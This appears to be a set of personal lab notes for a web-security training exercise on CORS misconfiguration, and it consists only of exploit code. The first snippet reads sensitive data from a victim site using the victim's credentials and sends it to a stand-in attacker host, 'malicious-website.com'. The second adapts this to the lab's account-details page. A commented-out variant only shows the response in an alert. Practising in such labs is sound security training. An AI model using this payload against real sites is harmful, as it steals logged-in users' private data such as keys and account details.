var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
   location='//malicious-website.com/log?key='+this.responseText;
};


<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>

修改后的
{/* <script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://0abb00970390721580ed3a6e0033001d.web-security-academy.net/',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        window.alert(this.responseText);
    };
</script> */}